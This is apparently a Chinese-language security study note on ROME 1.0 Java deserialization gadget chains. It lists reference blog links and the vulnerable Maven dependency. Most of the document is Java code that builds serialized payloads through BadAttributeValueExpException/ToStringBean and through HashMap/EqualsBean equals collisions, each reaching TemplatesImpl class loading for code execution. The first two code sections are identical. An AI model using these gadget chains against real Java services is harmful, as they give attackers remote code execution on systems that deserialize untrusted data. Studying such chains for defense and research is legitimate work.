### 文章
[ROME改造计划](https://y4tacker.github.io/2022/03/07/year/2022/3/ROME%E6%94%B9%E9%80%A0%E8%AE%A1%E5%88%92/#Step1%E2%80%93%E6%94%B9%E9%80%A0%E5%88%A9%E7%94%A8%E9%93%BE)<br />[ROME改造计划 _ Y4tacker's Blog.pdf](https://www.yuque.com/attachments/yuque/0/2023/pdf/25358086/1693743858584-57fa8aff-af42-4272-a127-e031aacd9824.pdf)<br />[Java安全学习——ROME反序列化 - 枫のBlog](https://goodapple.top/archives/1145)<br />[Java安全学习——ROME反序列化 - 枫のBlog.html](https://www.yuque.com/attachments/yuque/0/2023/html/25358086/1693793315386-a664578b-9cc7-482e-8b30-2cc2abb44c3f.html)
### 适用条件
```java
  <dependency>
      <groupId>rome</groupId>
      <artifactId>rome</artifactId>
      <version>1.0</version>
  </dependency>
```
### 利用链
#### 原始利用链
```java
package org.example;

import com.sun.syndication.feed.impl.ToStringBean;

import javax.management.BadAttributeValueExpException;
import javax.xml.transform.Templates;

/**
 * 通过 BadAttributeValueExpException 触发 ROME 链
 * BadAttributeValueExpException.readObject()
 *     ToStringBean.toString()
 *         pReadMethod.invoke()
 *             TemplatesImpl.getOutputProperties()
 *             TemplatesImpl.newTransformer()
 *             ......
 *             TemplatesImpl.defineClass()
 * */
public class RomeTest {

    public static void main(String[] args) throws Exception {
        Object templates = CreateTempates.createTemplatesImpl();
        // 第一个参数需要为 Templates.class 而不能是 TemplatesImpl.class ,防止 getStylesheetDOM 方法报错
        ToStringBean toStringBean = new ToStringBean(Templates.class, templates);
        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(1);
        Reflections.setFieldValue(badAttributeValueExpException, "val", toStringBean);
        Ser.serialize(badAttributeValueExpException, "ser.bin");
        Ser.unserialize("ser.bin");
    }
}

```
#### 通过 BadAttributeValueExpException 触发 ROME 链
```java
package org.example;

import com.sun.syndication.feed.impl.ToStringBean;

import javax.management.BadAttributeValueExpException;
import javax.xml.transform.Templates;

/**
 * 通过 BadAttributeValueExpException 触发 ROME 链
 * BadAttributeValueExpException.readObject()
 *     ToStringBean.toString()
 *         pReadMethod.invoke()
 *             TemplatesImpl.getOutputProperties()
 *             TemplatesImpl.newTransformer()
 *             ......
 *             TemplatesImpl.defineClass()
 * */
public class RomeTest {

    public static void main(String[] args) throws Exception {
        Object templates = CreateTempates.createTemplatesImpl();
        // 第一个参数需要为 Templates.class 而不能是 TemplatesImpl.class ,防止 getStylesheetDOM 方法报错
        ToStringBean toStringBean = new ToStringBean(Templates.class, templates);
        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(1);
        Reflections.setFieldValue(badAttributeValueExpException, "val", toStringBean);
        Ser.serialize(badAttributeValueExpException, "ser.bin");
        Ser.unserialize("ser.bin");
    }
}

```
#### 通过equals触发ROME链
```java
package org.example;

import com.sun.syndication.feed.impl.EqualsBean;

import javax.xml.transform.Templates;
import java.util.HashMap;

/**
 * @author qiluo
 * @date 2023/9/3 16:23
 * 通过 HashMap 的调用 equals 进行触发 EqualsBean 的 equals 方法
 * HashMap.readObject()
 * HashMap.putVal()
 *     HashMap1.equals(HashMap2)
 *     AbstractMap.equals(HashMap2)
 *         EqualsBean.equals(TemplatesImpl)
 *         EqualsBean.beanEquals(TemplatesImpl)
 *             pReadMethod.invoke()
 *                 TemplatesImpl.getOutputProperties()
 *                 ......
 *                 TransletClassLoader.defineClass()
 */
public class RomeTest2 {
    public static void main(String[] args) throws Exception {
        Object templates = CreateTempates.createTemplatesImpl();
        EqualsBean bean = new EqualsBean(String.class,"");
        HashMap map1 = new HashMap();
        HashMap map2 = new HashMap();
        map1.put("aa",templates);
        map1.put("bB",bean);
        map2.put("aa",bean);
        map2.put("bB",templates);
        HashMap map = new HashMap();
        map.put(map1,"");
        map.put(map2,"");

        Reflections.setFieldValue(bean,"_beanClass", Templates.class);
        Reflections.setFieldValue(bean,"_obj",templates);

        Ser.serialize(map, "ser.bin");
        Ser.unserialize("ser.bin");
    }
}

```
